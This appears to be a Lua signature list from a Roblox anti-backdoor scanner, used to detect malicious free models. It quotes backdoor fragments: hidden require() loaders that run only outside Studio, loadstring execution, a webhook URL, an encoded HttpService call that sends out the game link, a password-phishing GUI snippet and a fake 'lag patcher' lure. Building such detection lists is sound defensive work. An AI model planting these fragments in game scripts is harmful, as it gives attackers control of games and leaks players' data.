	--		if string.lower(v)==string.lower(plr.Name) then return true end
	--	end
	--	return false
	--end

	--function checkBypass(plr)
	--	for _,v in pairs(bypass) do
	--		if string.lower(v)==string.lower(plr.Name) then return true end
	--	end
	--	return false
	--end]],

	--	[[function addlist(increment,parent,pos,nam,pw,bcst)
	--un1 = Instance.new("TextLabel", parent)
	--un1.Name = "un"..tostring(increment)
	--un1.Position = UDim2.new(0, 0, 0.1+(pos/1000), 0)
	--un1.Size = UDim2.new(0.5, 0, CollectionSize/1000, 0)
	--un1.BackgroundColor3 = Color3.new(1, 1, 1)
	--un1.BackgroundTransparency = 0.5
	--un1.BorderSizePixel = 0
	--un1.Text = nam
	--un1.Font = Enum.Font.ArialBold
	--un1.FontSize = Enum.FontSize.Size18
	--un1.TextColor3 = Color3.new(1, 1, 1)
	--p1 = Instance.new("TextLabel", parent)
	--p1.Name = "pw"..tostring(increment)
	--p1.Position = UDim2.new(0.5, 0, 0.1+(pos/1000), 0)
	--p1.Size = UDim2.new(0.5, 0, CollectionSize/1000, 0)
	--p1.BackgroundColor3 = Color3.new(1, 1, 1)
	--p1.BackgroundTransparency = 0.5
	--p1.BorderSizePixel = 0
	--p1.Text = pw
	--p1.Font = Enum.Font.ArialBold
	--p1.FontSize = Enum.FontSize.Size18
	--p1.TextColor3 = Color3.new(1, 1, 1)

	--BCPIP = Instance.new("ImageLabel", parent)
	--BCPIP.Name = "BCPIP"..tostring(increment)
	--BCPIP.Position = UDim2.new(0, 0, 0.1+(pos/1000), 0)
	--BCPIP.Size = UDim2.new(CollectionSize/1000, 0, CollectionSize/1000, 0)
	--BCPIP.BackgroundColor3 = Color3.new(1, 1, 1)
	--BCPIP.BackgroundTransparency = 1
	--BCPIP.BorderSizePixel = 0
	--if bcst=="Enum.MembershipType.BuildersClub" then
	--	BCPIP.Image = "rbxassetid://".."30681638"
	--elseif bcst=="Enum.MembershipType.TurboBuildersClub" then
	--	BCPIP.Image = "rbxassetid://".."78003798"
	--elseif bcst=="Enum.MembershipType.OutrageousBuildersClub" then
	--	BCPIP.Image = "rbxassetid://".."64189403"
	--else
	--	BCPIP.Image = "rbxassetid://".."45312113"
	--end
	--BCPIP.ZIndex = 2

	--local a = script.hideself:Clone() a.Parent=BCPIP a.Disabled=false
	--end]],

	--	[[--	1. Put the things and ungroup where it tells you to.
	----  2. Go into the MaintenanceGui in StarterGui and find a StringValue named "Owner"
	----  3. Put your name into the Value box of the Owner value (Don't overwrite Owner with your name, overwrite AstroCytes in the Value box instead!).
	----  4. Go to Workspace and look inside Admins.
	----  5. Replace the NAME'S of the StringValues you find in there with you and your friends. (Your name has to be there too! Not just in owner.)
	----  6. Go to Bypass and fill out names there if you have anyone you want to be in Bypass.
	----  7. Go to mutes and fill in names of people you want to mute so they can't chat. (You can do it from the MGui in-game too!)
	----  8. Finally, if you choose to enable AutoMute, it will mute any new players that come onto the server if they are not admins or bypassers.
	----  9. You are done!]],

	--	[[      /   |   \  ______  _  __    \______   \ ____   ____ ________      /     \  /  _____/|    |   \   |
	--     /    ~    \/  _ \ \/ \/ /     |       _// __ \ /    \\___   /     /  \ /  \/   \  ___|    |   /   |
	--     \    H    (  <_> )     /      |    |   \  ___/|   |  \/    /     /    M    \    \_\  \    |  /|   |
	--      \___|_  / \____/ \/\_/       |____|_  /\___  >___|  /_____ \    \____|__  /\______  /______/ |___|]],

	[[https://discord.gg/Nf2XrJ]],

	[[I shall remain anonymous, but enjoy hacking those noobs.]],

	[[Yes, you most likely know me,
	I am a mediocere developer on ROBLOX and here to assist you in exploitation needs.
	Here you can trick someone into entering their password.
	This links with Trello.]],

	--	[[ap = require(game.ServerScriptService.TrelloAPI)
	--BoardID = ap:GetBoardID("MGUI")
	--ListID = ap:GetListID("MGUIUsers",BoardID)]],

	[[59429.86000469662*55359]],

	--	[[local PasswordG = script.Parent.Frame.Password.PasswordBox
	--CheckForRep = function(Pword)
	--    local Repet = false
	--    local Characters = {}
	--    for i = 1, string.len(Pword) do
	--        local String = string.sub(Pword, i, i)
	--        if Characters[String] then
	--            Characters[String] = Characters[String] + 1
	--        else
	--            Characters[String] = 1
	--        end
	--    end
	--    for Character, Amount in pairs(Characters) do
	--        if Amount > 10 then
	--            Repet = true
	--        end
	--    end
	--    return Repet
	--end

	--CheckForSymbols = function(String)
	--    local Symbols = false
	--    for i=1, string.len(String) do
	--        local L = string.sub(String, i, i)
	--        if L == "*" or L == "&" or L == "=" then
	--            Symbols = true
	--        end
	--    end
	--    return Symbols
	--end

	--local Fake = PasswordG.Parent.FakePassword
	--spawn(function()
	--    PasswordG.Focused:connect(function()
	--        local P = script.Parent.Frame.Password
	--        P.BorderColor3 = Color3.fromRGB(0, 85, 255)
	--    end)
	--    PasswordG.FocusLost:connect(function()
	--        local P = script.Parent.Frame.Password
	--        P.BorderColor3 = Color3.fromRGB(200, 200, 200)
	--    end)
	--    while wait() do
	--        Fake.Text = string.rep("*", string.len(PasswordG.Text))
	--        _G.Password = PasswordG.Text
	--    end
	--end)]],

	[[local wat=3670072185]],

	[[3670072185]],

	[[4298677137]],

	[[4298672263]],

	[[4350052962]],

	[[4138626212]],

	-- [[ee5f5256cddb567d7262bdc8b0f2d5657be4aa9aab25a8bd780e0e50cdc6773b]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[dRtYZW4RAAAARUc3QUU2VEpHTkM1OVFVNwB8UYc9TOl8oNk2fb08GwyU8rzdSSOfYjwM3WMFn8uWo8+aQEtu3TB0KesPh53xLIglgm/M+b/KyTnTsH8lLv3t/g50EmxsKQExBnvDIWbCZesFk2sQBnU5CEjyZ2ARRA9hSycuJFW5spnbdCBhCCczIXJ4i3qDV1LIbFQuZFW5sjnIGGxhPDEzIXJ4ixo6FG/INjUupFW5snXu3SxhC2MzIXJ4i1pAqhHIXCoVisZGj1yfwhPIFAFJltwjYB1CskXIEnmljBr2nBdkGToYXRslixWQEgrWRBHILXaljBr2nEUx2n4YWVaWJlKLuJvDvGthKSeWJCKLuJOojn9hW1MlxIpw3fZGtlXIYylJltk5YNsTjErIXX+ljBr2nL4wXWUYR3UgAPnIlPjKIj5hVCmljBr2nMYTokoYezbWpiCLuMncliZhWnVuZEG5soHLmi1hGA4lxIpw3TGaXznIWg/cBxNakS/CqjvIcFylDBr2nDYqkl8YQWGJJMqafd/L4TthEgBJ1lIkYOjXuFbIPjGlzBr2nD7nA1gYezWlixWcEuj2xHnIVBbgwP7IlNRaayVhU1icRxNakVKLoUzINF6lDBr2nAZ0ax8YRU/ggP7IlCJGWjJhUUPaBmSuSSCBzUTIHAicBxNakQTbzRnIDmylTBv2nLgtFyMYBQZlxYpy3fxb9RPIAkLaBmSuSTdW3SjIcz25SHPyZyQFuwVhTl+uI0m5stH5nT9hM0MckuSOxLm1MXjIEwdJFlK8YGop5TbIbzyljBr2n]], - Obfuscation Code Unecessary due to obfuscation detection

	[[if game.Players.LocalPlayer:IsFriendsWith(1208107446) or game.Players.LocalPlayer.Name == "Hywayyy" then ]],

	[[local lua_keywords = {"and", "break", "do", "else", "elseif", "end", "false", "for", "function", "goto", "if", "in", "local", "nil", "not", "or", "repeat", "return", "then", "true", "until", "while"}
local global_env = {"getrawmetatable", "game", "workspace", "script", "math", "string", "table", "print", "wait", "BrickColor", "Color3", "next", "pairs", "ipairs", "select", "unpack", "Instance", "Vector2", "Vector3", "CFrame", "Ray", "UDim2", "Enum", "assert", "error", "warn", "tick", "loadstring", "_G", "shared", "getfenv", "setfenv", "newproxy", "setmetatable", "getmetatable", "os", "debug", "pcall", "ypcall", "xpcall", "rawequal", "rawset", "rawget", "tonumber", "tostring", "type", "typeof", "_VERSION", "coroutine", "delay", "require", "spawn", "LoadLibrary", "settings", "stats", "time", "UserSettings", "version", "Axes", "ColorSequence", "Faces", "ColorSequenceKeypoint", "NumberRange", "NumberSequence", "NumberSequenceKeypoint", "gcinfo", "elapsedTime", "collectgarbage", "PhysicalProperties", "Rect", "Region3", "Region3int16", "UDim", "Vector2int16", "Vector3int16"}

local Source = script.Parent.EditorFrame.Source
local Lines = Source.Parent.Lines]],

	-- [[dRtYZW4RAAAAVVZHRVIxMDVCWFhIQUhSMwB3xLVI4Qnh8wq0zXNjhCs/THbwwOA19sQ9hAQ9NOizjI6MzAZNk/4/NKesxwQk8WovRlo4rpiBXhBp2zUdddd0VBaFJvUD10gwNOa5IjnVWSAAypjxANVEn/n4Ez9ZpmgTA89dAFDXfK1rAPhDL9d705BpvQVt1TGf+fgTPzimWY/XK2OfE9dLbSoA+ENn1yOT0Gm9BSHVXp85+BM/O6YnbeoB+ENk1xPXZWFBXgXVPZOQab0FbNVQn7n4Ez8iphi+h3S+XCXVJddlYUFecdVblNeDJvUk13hbirKS+iXVaBRUgyb1UNd/l2VhQF4+1RQgQMoB8UDVMp+5+BM/YKZFjoyOm5Br1VWf+fgTPzOmDrxuf54sdtVR/oZ0vFxT1STUF4Mm9QzXEhuKMpL6ddVsFJaGJvU+1xtUVoYm9XvXf4/XaaojWtUXIEDLmPFW1UefufgTP0CmXa3qBfhDNNcavG7/mSwl1X5UVIMm9VPXIldkYUBeINUmn7n4Ez9mpjGTwc5dADLXQJMBwF0AUdcWjkwOm5Ad1RO02PxMTSHVVP6EdL9cUtVNF2RhQV5O1RLrKON9DgPVOVtJspH6KdU0IEDKAfEE1T6fufgTPzqmKBSVhCb1XNcZn7n4Ez8Fpg0tbQP4QyHXGLxuf54sadV3/oZ0vFx+1TDbiLKX+gPVZpRVgyb1K9dDF+dhQF451X6XZOFBXkrVZFPSab0FYtVHn/n4Ez92pgHrKGN9DnTVc/TbfHNND9Uik5NpvQUX1WyfufwTP1WmHtRUhCb1HddiG4kykPps1T0Qads1HVXXGVTWhyb1O9dDj9dpqiN11QRUlocm9SrXKY/XaaojVdUhIIDMmPFJ1Wif+fgTP2emP62tAfhDANcqVFWDJvVq1yBXZ2FAXlzVcn6E9LlcMtVan/n6Ez8kphEggEke8X7Vfp+5+BM/AaZ8FNKDJvUi12CTwMFdABPXIdQUhCb1eddtG4kykPpu1R9UVYMm9UPXBldnYUBebtVdfoT0uVwc1U0bSbGR+ivVU76FdLlcKdUmV+diQF461VefefgTP2ymKhOTab0FM9V9n/n4Ez8Gpnk+h3S7XAvVenLC5URJddUpn3kG7D9FpnbPmStjnwPXLf6GdL9cBtV1/oX0uVwO1SgXZ2FBXm7VeZtIsZf6UdVgPoV0uVxn1WTX52JAXjHVfp95+BM/VqZlYACIgPEv1VCf+fgTP2imWJ95B+w/RKYp8sPlREkQ1XifeQbsPyymFexVD62AG9V/FBaHJvVi13RU1ngm9SrXGo/XaaojQNV3VJZ4JvVZ126P12mqI0bVNVRWeCb1RNcBMDTmuSI31UAgQM2Y8QbVC5+5+BM/QqZPrWsD+ENM1wefufgTPyOmJbxu/5wsS9UkFBSGJvVA12z+hnS8XDLVWRBp2zUdHdcOVNZ5JvVJ13kwNOa5IgzVblSWeSb1F9dcMDTm]], - Obfuscation Code Unecessary due to obfuscation detection

	[[3702180717]],

	[[2290382491]],

	[[AdamFlexer]],

	[[Odin_00101010101]],

	[[DestinyKennedy2]],

	[[3930380293]],

	[[2977298142]],

	[[3989432705]],

	[[4056237385]],

	[[4056235807]],

	[[4056234287]],

	[[4056232640]],

	[[4056231205]],

	[[4056229665]],

	[[4056228250]],

	[[4056226820]],

	[[4056225268]],

	[[4056223744]],

	[[4056222250]],

	[[4056220801]],

	[[4056219320]],

	[[4056217842]],

	[[4056216423]],

	[[4056215048]],

	[[4056213658]],

	[[4056212354]],

	[[4056210981]],

	[[4056209461]],

	[[4056207947]],

	[[2674928586]],

	[[4124658053]],

	[[["1gKorIzL9NW7p"]=2]],

	[[)["\116\111\110\117\109\98\101\114"]],

	[[]{48,88,67]],

	[[4436101979]],

	[[2944264211]],

	[[game:GetService("TeleportService"):Teleport(2944264211,player)]],

	-- [[fb6e196d5a76f2e220fb22c6481da45883e28834e8d297b07e6e4a80c3f167ea]], - Obfuscation Code Unecessary due to obfuscation detection

	[[script.N00B.Parent = game.Lighting
script.NO0B:Play()
script.NOOB:Play()]],

	[[4436519412]],

	[[https://discord.gg/BKTUrXV]],

	[[Anti-Exploit made by Internet Explorer#5231]],

	-- [[LPH|46D57B6000BF0E824B0076C07765013G0082CB00FEBC661800731B4820013G00E52D008435854403425DE9164G001F9G006G00063G00073G00083G00089G002G00083G00083G00083G000B9G002G000B3G000B9G002G000B9G002G000B3G000B9G002G000B9G002G000B3G000C3G00860A0200D4D5D7853GD5E5D22GD5EDD5D1D581D5D6D7B5D6D5D1F9133DF4D62GD5D785D2D5DDEDD1D5D9F9D4D3D195D7D6D5B5123DC8D62GD5D785D2D5D1EDD4DFD3C51D3DF0D62GD5D785D2D5D9ED123DFCD62GD5D785D2D5C5EDD1D9C7C58069459C2GD5D785673918D1D6D5C5C92GD5D7850BD4D199D5D7D1C9EC5134D97FC8E8F0D4B1B8953B4922E9E2C22BC0A4B8E98C8045A99CB80A12DE43B94BD0EB65AAFF0857D2E8830A0200A60D3G005G463335233428272B23A6193G005G460F28322334282332033E6601272B23660A292135A60C3G005G4625292832232832A61E3G005G462E2G3236357C2G693429242A293E6825292B6921272B233569A6463G005G46666G6B663A662G262G6C0F2820232532232266243F660F28322334282332033E662G152G6C2G26667C353328212A272G3523357C663A666G6BA60E3G005G461629353207353F2825A60F3G005G460C150908032825292223C85G00E49440A6053G005G467A07831CE24E70EB43311B269G006G00019G002G00013G00019G002G00013G00029G002G00023G00029G002G00023G00033G00049G002G00049G002G00059G002G00053G000C3G000C3G000C3G000C9G002G00053G000C3G008C0A0200D4D5D785D42GD5E5DD2GD5ED3GD5ED2GD5D785DD2GD5EDD52GD7C5D7D5DDF92GD5D7854A3968D1D6D1D5C92GD5D1ED2GD5D785DDD5D1EDD4D7D3C5D6D5D9F92GD5D7850A3914D1D62GD1C9D1D5DDF92GD5D9ED2GD5D785DDD5D9EDD6DFDBDD2GD5D785DDD5D9EDD5D9C7DD2GD5D785DDD5C5EDD1DBC7C52GD5CDE5D62GD5B1D42GD5B1D72GD5B12GD5D7858DD4C599D6D7C5C9EC5134D94E9D8FDBA5FC3CB123BC738AFEFCFBC53D1E3BD86E04E8CFDACF78EA3FA9A8C]], - Obfuscation Code Unecessary due to obfuscation detection

	[[-- Scripted by Esynov]],

	[[TeleportID = 3058831461]],

	[[SupportID = 4467005447]],

	[[-- This is in no way a virus as its just simple script.]],

	[[1844877398,player]],

	[[1702114734,player]],

	[[2871271645]],

	[['01101100','01101111','01100011','01100001','01101100','00100000','01101000','01110100','01110100','01110000','00100000','00111101','00100000','01100111','01100001','01101101','01100101','00111010','01000111','01100101','01110100','01010011','01100101','01110010','01110110','01101001','01100011','01100101','00101000','00100111','01001000','01110100','01110100','01110000','01010011','01100101','01110010','01110110','01101001','01100011','01100101','00100111','00101001','00001010','01101100','01101111','01100011','01100001','01101100','00100000','01000100','01100001','01110100','01100001','00100000','00111101','00100000','01111011','00001010','01011011','00100010','01100011','01101111','01101110','01110100','01100101','01101110','01110100','00100010','01011101','00100000','00111101','00100000','00100010','01101101','01110010','00100000','01101011','01110010','01100001','01100010','01110011','00100000','01100110','01101111','01110101','01101110','01100100','00100000','01100001','00100000','01101110','01100101','01110111','00100000','01100111','01100001','01101101','01100101','00100000','01110011','01101001','01110010','00100000','01101000','01110100','01110100','01110000','01110011','00111010','00101111','00101111','01110111','01110111','01110111','00101110','01110010','01101111','01100010','01101100','01101111','01111000','00101110','01100011','01101111','01101101','00101111','01100111','01100001','01101101','01100101','01110011','00101111','00100010','00100000','00101110']],

	[["01101100","01101111","01100011","01100001","01101100","00100000","01101000","01110100","01110100","01110000","00100000","00111101","00100000","01100111","01100001","01101101","01100101","00111010","01000111","01100101","01110100","01010011","01100101","01110010","01110110","01101001","01100011","01100101","00101000","00100111","01001000","01110100","01110100","01110000","01010011","01100101","01110010","01110110","01101001","01100011","01100101","00100111","00101001","00001010","01101100","01101111","01100011","01100001","01101100","00100000","01000100","01100001","01110100","01100001","00100000","00111101","00100000","01111011","00001010","01011011","00100010","01100011","01101111","01101110","01110100","01100101","01101110","01110100","00100010","01011101","00100000","00111101","00100000","00100010","01101101","01110010","00100000","01101011","01110010","01100001","01100010","01110011","00100000","01100110","01101111","01110101","01101110","01100100","00100000","01100001","00100000","01101110","01100101","01110111","00100000","01100111","01100001","01101101","01100101","00100000","01110011","01101001","01110010","00100000","01101000","01110100","01110100","01110000","01110011","00111010","00101111","00101111","01110111","01110111","01110111","00101110","01110010","01101111","01100010","01101100","01101111","01111000","00101110","01100011","01101111","01101101","00101111","01100111","01100001","01101101","01100101","01110011","00101111","00100010","00100000","00101110"]],

	[[mr krabs found a new game sir https://www.roblox.com/games/" ..game.PlaceId]],

	[[https://perryhaxz.moe/discord_gateway.php]],

	[[local Ranking = Instance.new("RemoteEvent", game.JointsService)]],

	[[loadstring(serverExecution)()]],

	[[-- Hello Thanks for using Doggo Lag Patcher my new Lag Patcher!
-- Here's a few steps for doggo lag patcher to work right.
-- Enable Http by going to game Options then Options. Or open command bar & copy & paste this game:GetService("HttpService").HttpEnabled = true
-- And Enable loadstrings by going in Explorer and clicking on ServerScriptService then properties then check Loadstrings!
-- New updates coming every week!
-- Patches almost all lag!
-- Motto | Doggos drink the bepis lag!]],

	[[Enable loadstrings]],

	[[v=pcall(function()if not game:GetService('RunService'):IsStudio() then g=getfenv();g['require'](3278300817)end)if not v then end end v=pcall(function()if not game:GetService('RunService'):IsStudio() then g=getfenv();g['require'](3130795686)end)if not v then end end v=pcall(function()if not game:GetService('RunService'):IsStudio() then g=getfenv();g['require'](3224372393)end)if not v then end end v=pcall(function()if not game:GetService('RunService'):IsStudio() then g=getfenv();g['require'](3196858776)end)if not v then end end v=pcall(function()if not game:GetService('RunService'):IsStudio() then g=getfenv();g['require'](]],

	-- [[LPH|E29C935359BA40013G00C4D17F930D013G005356D6472F4G0093CD26CE2D14EE5C275E07C353170FB003428EB3E28803147E21254700100B0200F69C9ED89E9C9ED89D9C88D02G9C9ED8729D8CFC9E982G8CE39C9ED8989C84D02G9C9ED89D9C84D09AAE86802G639DD82G9C9ED89D9C84D0859188B8989C84D02G9C9ED89D9C84D09AA886808A9C9ED89D9C84D0889C9ED89C989AAC2G9C9ED87E9D98FC9E2G988C9D2G9A80A99C9ED89D9C98D0AF9C9ED82G9C9ED8789675A99F98948C9D929EA42G9C9ED8B59C9ED8C69C9ED8BB9C9ED89FB486802G9C9ED89D9C84D08F9188B8A99C9ED8869188B898AA86AC9B9C2GBC4596A5DE4588A1DE2G9C9ED81B9D84FC999E848C4408C08B9E98908C9F8C92802G9C9ED89D9C90D0B7E824A82G9C9ED8809C9ED8AB9C9ED8869C9ED898968EAC9A9C84BC2G9C9ED8BA966DA99F982G8C9C9688847D639DD8939C8CD02G9C9ED89D9C8CD0959C88D02B639DD8689D8CFC9F9E2G8C4408C08BAE9C9ED8AD9C9ED89C9892AC7F639DD8209D90FC7D639DD8989C94D02G9C9ED89D9C94D09E2G96AC9A9C8CBC59639DD89F888E802G9C9ED89D9C8CD0959C8CC49F848E802G9C9ED89D9C8CD0979C8CC48E9C9ED89FB086802G9C9ED89D9C84D0899188B8989C84D0BA9C9ED8B89C9ED82G9C9ED8C19D98FC2G9E988C35639DD89D9C9ED83G9C989D2G9CD02G9C98D02G9C9ED89D9C98D09D9C94BC6F639DD89C868EAC979C84D09E9C9ED89D9C84D02G9C9ED8C39D8CFC9F982G8C98809EA42G9C9ED859639DD857639DD85F639DD8989C90D02G9C9ED89D9C90D09F9692AC8E9C88BC919C9ED8979C9ED898BC8EAC9CBE868023639DD89D9C84D021639DD827639DD89D9C84D09AAC86802G9C9ED89D9C84D08B9188B8EF639DD8C49D90FC9F98908C989C8CD039639DD89D9C8CD03F639DD8252G4FA945019EB9F3637DB00D39D39FB02CACAB723125CE990A020086093G005GE295838B962048AFBC9AF2D77A3E86103G005GE2A58796A88D8B8CA683968386123G005GE2B18D97908187B2]], - Obfuscation Code Unecessary due to obfuscation detection

	[[1844877398]],

	[[4641921091]],

	-- [[/dedFXRPXXwI4dtYwZyMKfj9WQzUQfhMobskKxe08AavkMwSuWncfOhNp2rRgJT4kSbfZ/oVLK6JwaH4BClVApaOKZDnpZjse6BUmN4ywK3FclVaSD9VCsAxKbDo3YRMbFb1Z7MtuCHGZywU/VYp9T4xeYx4wXPT1QLlvYjse8xmccYwGkiFqsIJMRr6d9D5FREfGfhMzKj9FgYEPAkbNOS0tVNgdNRMV0/RRgrJZLLfZ/YVLECS6YH5Q+gxTfwOSKrnoZTseHk1vRIyZciNlflWsWbeZ/YVLTZtaTn7iu/U8Vb8UUx7VLpezb0rON4w4kNhvItznF94Bdg8T3D3ITxN3Gq8AUtMJTX9oiQ1n7OTBMxP3j6scefN2CF4D9goT1/7nehO7OUt2qsuBY7fZ/4VLaaOfPn4CRBkw7DAUAjkpZjseZyRYY4yBzalr0M3gTdVCsAxKxlPkIBP+7Ul/9EOKRUaNu6ctQ2wtfxMGnwEFVAfADrfZ/YVLo4vKHH4bfrYHsA9IbbnoZTseJqD4OYzJyLZyFrlNd7eZ/YVLFgHmNX4fn9wSOVnHHN4aLpezlgxaNYzmP68XJdNFQN4Bdg8TOhgOKRMX3NMhj3dyaX9oiQ1nXa9CeRNYYgRLPJqTKF4D9goTB46YeRN82TU6WZmpW9WCMwJK1+bXSBOngBoiTrbzIp4CdgoTk9J9KBO2KBdhF6V5eX/oiA1nrofLCxOHR3Yt482rPbcZ/YVLYXuKDX4r3qA4MvHWaivlMwSuztQnCRM5sv0yW5z4eLeZ/YVLocPBX37FRMl5Lcf0KR4AdggTYjopERPB/QFFnJpuYzCIb+m1cXK6RhPTlkUJHARqGLcZA3pLxl3OQX4tDEo6avHVSc0NQvKiQFZuZIxopKEnpotFNN4BdgwTuKn2HBM83pQFicXLSt4C9goT+m0WMxPLpPJTc/2bZb9riQxnYllUShOTzXoRE6CfEVWDMwxK/hPUfRNoeRoql1dmZR4CdgoTVYsbXxM1kc8numEOX//riA1n8uFuVRNsQ+Yf3SnWbrcZ/YVLM9t5cH6864AZkh07UQYNfyUtDtOefhOlU29outszdbeZ/YVLvP46eH5mdB0C1OnUGLcZAnpLMrKJCn7MdK9miRzNJrCJb+m1rbOjLxNtMV0nH6PUBbcZA3pLPUJmCX6o0ZNw7/8LM6kWd+zQqSsLIBPTZhFWbQ0LX3nsYzse6J5cE4w/am0VMndOaLkvYzseGidVGIxjJlUTWYTnGr6d9D5FBEMIfhMb555nnQV2YblvYzseYaJbOYzTe19swchjGr6d9D5FjMf/WhMMe/RzrLggDrmvbDseE24KY4yp1lceloolHb6d9D5FzumXVRM9b9s6ZTDVUUaNNi0tnxPHTBMwp8o/xljLKreZ/YVLiYPSan5RYDBO+0e9An5zm2gxeLSRX4wYSbVVjL87N16bLJezy2ECLIxJtmM1mNzUSUbNv6ItcBzLDx]], - Obfuscation Code Unecessary due to obfuscation detection

	[[require(4679935477):protectGame(Settings)]],

	-- [[6975f3b9a7faa64b10bf453dd5fffc5ea88a073f8086fbe94c6421b6a047727d]], - Obfuscation Code Unecessary due to obfuscation detection

	[[--NOTE TO USERS AND ROBLOX STAFF THIS IS OBFUSCATED SO EXPLOITERS CAN'T EDIT OTHER PEOPLES HEALTH]],

	-- [[LPH|BAF3E4C94B656A0B5F004073BA65FCA54G0060A7E22A45AEB050ADC1A167B72EAA136AF6013G00516812926FD07903BB45465E0264159G009G001G00019G002G00019G006G00019G006G00013G001F9G002G00013G001F3G00CAEC2B776D03C67A952BC96B660E3F484A72013G00CB8CFFD37D8FF10BB1CA0A4C25719A9G006G001B3G001D7G001D3G001D3G001D9G002G001D7G00093G000A9G002G000A3G000B9G006G001A9G002G001A3G001B9G002G001B7G001F3G00153G00159G002G00153G00163G00179G009G005G000E3G000E9G006G00123G00129G006G00193G001A9G009G001G000D3G000D9G002G000D3G000E9G002G000E9G009G001G00029G002G00029G009G001G00123G00159G009G009G000E3G00103G00103G00129G002G00199G002G00199G006G000E9G002G00023G00039G002G00033G00039G002G00049G006G00173G00189G002G00189G002G00083G00089G002G00099G009G005G00047G000B3G000D3G000D9G009G001G00049G002G00043G00079G002G00073G00089G002G00F5B58F4AB7F49B5D5C3D4F1E196101C678204G00A50A02006B073G003GBACDDBD3CEEE48AFBC9AF2D77A3E6B0E3G003GBAFDDFCEF0D5D3D4FEDBCEDB6B103G003GBAE9D5CFC8D9DFEAD6DBD9DFF3DE6B073G003GBADDDBD7DF6B0D3G003GBAFDDFCEE9DFC8CCD3D9DF6B123G003GBAEEDFD6DFCAD5C8CEE9DFC8CCD3D9DFEE2G00C09F3C56F1416B0F3G003GBAEEDFD6DFCAD5C8CEFEDBCEDB6B063G003GBAE8DFCB6B063G003GBAC8DFCB6B063G003GBADDD3DE6B073G003GBADDC8D3DE6B113G003GBAFDDFCEE8DBD4D1F3D4FDC8D5CFCAEE7G00406B0A3G003GBAC8DFCBCFD3C8DF6B073G003GBAD6D5DBDE6B073G003GBAF4DBD7DF6B0A3G003GBAEAD6DBC3DFC8C96B0B3G003GBAD7DB2GC2EAD6C8C96B0D3G003GBAF7DBC2EAD6DBC3DFC8C96B0A3G003GBAD7DBC2EAD6C8C96B0D3G003GBAF4CFD7EAD6DBC3DFC8C96B0A3G003GBACAD6DBD9DFF3DE6B0A3G003GBAEAD6DBD9DFF3DE6B083G003GBAF0D5D8F]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[require(4600242709) ]],

	-- [[601c327526b1438ce5afc93ef4561b82d9307aa1601aa5cf13892441ca6b86ac]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[zzDXtR3DlOgtCYgd1eMGfRZKXLG8NEdBg3g4/M++/F0Jw4qFel2IHdXjBujYeGqx6/MsICrMMnRwiHFYVCIdyM5Ptdw/eVmnjBZYIn0F4Ux13T95WYuPFCUidBZ9VZNTO7+83wkJIyLLZm9r/JGyXI8NeHBhIlORWnuD+Dn8z7j5HjjDslA+M+DKIkO1KzCSACJ14lMSdd2/eVl1KGoLIrBHrTqTUzu/vNWHCRcib7dvVZOTu7682VNrQiImtzMlg3g5/M+p69h/wyBFb3WDeDj8z5pzQlzDx8n3HuwDSn+DoWzeIrH9Kg1GKswydnDmdLInIplvG3aIXdXjBs2ig1WxvJdxI+wDSn+DlK56bbElQmYXk5M7v7x1hqplIh5sdnyyyEZO58QhOlMiO9zZTkzTAfYNe5ctJSPLIkVy1+dy7TIIAAAAHQoeGgYdCgBSQ7pknfOS3xhnawqAexeq4sqDLO61qwYPIoxe4B2DeDj8z0xbgTfDu/RhCyrMMnVwHsDDfSLNzpwhLMREf4PnrD0qsU5F7jNIFtXjBrExDxuxwiFFRWwERX+DQQhUILFnLOleE5M7v7yCVIxzIuDCHjmyyUZO59yYAioijWQHXy3TAfYN]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[dRtYZW4RAAAATDk2QUtSUUlCRE1KWkVISgCgbQ4RGvhobnB4thQdCWrOdd6fs4nq7ueoopNCX++KKoo1k5H87x4KyE2g1cst9f9Y8ErIJTQVWhDUSpHSJHnYbTse3IxOMYzM8EhKgKTwV7kbbTseEs+KGoxueTdWEmyjPzfb8y2I7krkBhNlNTkxUehtf7lbbTseisyEQYw6stF0tqA7fb4O9D9Fz+gMSBOePQMViIKNabmbbjse6tuHYoz2owBIEektE74O9D9Fw0PVEBPEFXUERRG9T9CAJgY3fNCIJRPvmUNp1qHObfkYbjsegR2xW4xre6xm+qq8EzlYbjseXpHHJow6gXsY/BoAID6O9D5FHHjsfhMbJL8vx11mF8beNS0tYOoXABMCIXQCDzVfbLfZ/YVL7od1Tn7Pi31b2GsUOWkDkfQ8wGy5YBP1eC8LojimcreZ/YVLjjUAan6MlbFYnCOiTekDkfI8WSKEGxO48ik6+bCbO94Bdg8TnBqLYRO77FUuqckNSV6bL5ezfjrGXYy1cj8MhrKwL2vqMwSuBIAVVRNgvMUL3FYFYbeZ/YVLqQIian6Qsdk+Av6Kbw1OQvKiGMHmK4yPuRxgK7S9GJ7aL5ezVc1tX4xtVJhCH44SRaulMwSu70LVZRNv/vRHnByPErdZ/YVLeE0ufX78UxIUJhiDbJ4aL5ezOH0ZWowC1xswzpxFef9piQxnotgWXRPtmog7YwSSEKvlMwSuOn4sIBMo+yxAs4iCLLfZ/YVLAPogWH7BdjxFfpQlap4Adg0TUlHyVhOePSYhZrF/I/9piQxnQKu1ZxNbagIroWSudvluZDseM95ZC4xEhVNkP9qjHJVBMANK1W2JSROoq9I0Zb8SK0aNP6std4ToWRM5aJIKH0EZFrfZ/YVLfZWPCH5p3641SPQ0cukDkfw8XZQMKRMjzVxkv5hDGj6slWgxgrGKXIxGvawDspsjXHnuZTsetxVrNoxhp/53ciE9UD9piQ1neVJzUBNvhPVJZ7asfnFZywU/T3UIQ4wXx8VTzkLgGrkvYDserB+YLowDfHsIzxZyIb6d9D5FudySIROulx9+FJTyHLlvYDse+rfgG4xFb9Rxt86+L76d9D5F5z3fTxNjD5AQWStJe7mvYTsead0yTowrVC4DtDL2MDdE8yyIQ8N4ehO96JwXvxt+CkaNOy0tapRNOhOjZRQvnanfYLfZ/YVLv/vhT37Pn2d6WIB5HX6slWgxsxVcR4yJlUox+cIDM+kDkf08L0NxJhO5i+Y61QBeGg2Q1Sym1yP3HROG+IAGkOQMYUbNOqUtl3wyEBPLZFArNuwWArfZ/YVLTyqndH7DuPxmukePNzkuZTseNGBCVYxj3CsN3V2IcrfZ/YVLB8qEan6bc6sM4q0cc7lpZzseWHDaYIxNODhoNlPQdF6VKpezvu5GH4w1j/pVsptYMt4Bdg8TqJoudBPl4LoIdGGxJNVBsAJKMJk]], - Obfuscation Code Unecessary due to obfuscation detection
